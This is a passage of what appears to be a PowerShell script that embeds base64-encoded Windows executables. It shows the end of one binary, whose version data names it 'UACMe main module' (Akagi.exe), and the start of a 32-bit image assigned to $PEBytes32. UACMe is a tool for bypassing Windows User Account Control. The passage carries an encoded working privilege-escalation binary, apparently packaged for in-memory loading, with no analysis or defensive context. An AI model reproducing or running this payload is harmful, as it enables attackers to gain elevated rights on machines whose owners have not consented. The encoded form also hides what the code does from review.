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"
	$PEBytes32 = "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